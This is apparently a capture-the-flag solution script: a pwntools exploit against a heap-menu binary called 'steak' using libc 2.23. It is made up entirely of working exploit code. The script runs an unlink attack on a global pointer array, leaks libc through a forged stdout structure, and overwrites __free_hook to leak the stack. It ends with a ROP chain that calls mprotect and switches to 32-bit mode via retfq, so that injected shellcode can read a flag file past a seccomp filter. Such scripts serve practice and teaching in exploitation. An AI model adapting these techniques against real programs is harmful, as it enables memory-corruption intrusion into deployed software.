from pwn import *
p = process("./steak")
libc = ELF("./libc-2.23.so")
src = 0x006021A0
stdout = 0x00602180
def add(sz,content):
	p.recvuntil(">")
	p.sendline("1")
	p.recvuntil("input buf size:")
	p.sendline(str(sz))
	p.recvuntil("input buf:")
	p.send(content)
def delete(idx):
	p.recvuntil(">")
	p.sendline("2")
	p.recvuntil("input index:")
	p.sendline(str(idx))
def edit(idx,sz,content):
	p.recvuntil(">")
	p.sendline("3")
	p.recvuntil("input index:")
	p.sendline(str(idx))
	p.recvuntil("input size:")
	p.sendline(str(sz))
	p.recvuntil("input new buf:")
	p.send(content)
def copy(source_idx,dest_idx,length):
	p.recvuntil(">")
	p.sendline("4")
	p.recvuntil("input source index:")
	p.sendline(str(source_idx))
	p.recvuntil("input dest index:")
	p.sendline(str(dest_idx))
	p.recvuntil("input copy length:")
	p.sendline(str(length))
def main():
	gdb.attach(p,"b *0x400BDB")
	#unlink	make src[3] = src[0]
	add(0x80,'a'*0x80)	#0
	add(0x80,'a'*0x80)	#1
	add(0x80,'a'*0x80)	#2
	add(0x80,'a'*0x80)	#3
	add(0x80,'a'*0x80)	#4
	payload = p64(0) + p64(0x81) + p64(src) + p64(src+8)
	payload += 'd'*0x60 + p64(0x80) + p64(0x90)
	edit(3,0x90,payload)
	delete(4)
	#leak libc
	edit(3,0x10,p64(src)+p64(stdout))
	copy(1,0,8)	#src[0] = stdout
	payload = p64(0xfba1800) + p64(0)*3 + '\x00'
	edit(0,len(payload),payload)
	p.recvline()
	p.recv(24)
	libc.address = u64(p.recv(6).ljust(8,'\x00')) - 0x3c36e0
	p.info("libc base --> " + hex(libc.address))
	#write free_hook to leak stack
	free_hook = libc.symbols["__free_hook"]
	puts = libc.symbols["puts"]
	env = libc.symbols["environ"]
	edit(3,16,p64(free_hook)+p64(env))
	edit(0,8,p64(puts))
	delete(1)
	stack = u64(p.recv(7)[1:].ljust(8,"\x00"))
	p.info("stack  --> " + hex(stack))
	ret = stack-0xf0
	
	#open read write
	shellcode = asm('mov esp,0x602500') + asm(shellcraft.open("flag"))
	ss = '''
	mov ebx,eax
	mov ecx,0x602900
	mov edx,0x50
	int 0x80
	mov eax,4
	mov ebx,1
	mov ecx,0x602900
	mov edx,0x50
	int 0x80
	'''
	shellcode += asm(ss)
	p_rdi = 0x400ca3
	p_rdx_rsi = 0x1150c9+libc.address
	mprotect = libc.symbols["mprotect"]
	'''
	code = asm('retfq',arch='amd64')
	code = next(libc.search(code))#0x811dc
	log.success('retfq address: {}'.format(hex(code)))
	0x811dc
	'''
	retfq = 0x811dc + libc.address
	mode = p64(retfq) + p64(0x602500) + p64(0x23)
	rop = p64(p_rdi) + p64(0x602000) + p64(p_rdx_rsi) + p64(7)
	rop += p64(0x1000) + p64(mprotect) + mode
	#shellcode len is 63
	edit(3,8,p64(0x602500))
	edit(0,0x44,shellcode+'\x00'+'flag')
	edit(3,8,p64(ret))
	edit(0,len(rop),rop)
	
	p.recvuntil(">")
	p.sendline("5")
	p.interactive()
if __name__ == "__main__":
	main()